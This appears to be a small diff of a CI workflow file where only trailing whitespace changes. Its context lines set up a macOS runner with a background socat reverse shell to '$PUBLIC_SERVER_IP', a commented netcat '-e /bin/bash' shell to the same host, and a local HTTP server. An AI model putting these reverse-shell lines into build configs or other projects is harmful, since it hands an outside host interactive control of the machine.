@@ -30,7 +30,7 @@ jobs:
           brew install sshpass netcat wget socat #dropbear openssh rlwrap
           # netcat $PUBLIC_SERVER_IP 2333 -e /bin/bash
           nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2222 &
-          xcrun python3 -m http.server 8888
+          xcrun python3 -m http.server 8888 
 
   linux-test-jb:
     name: linux_check
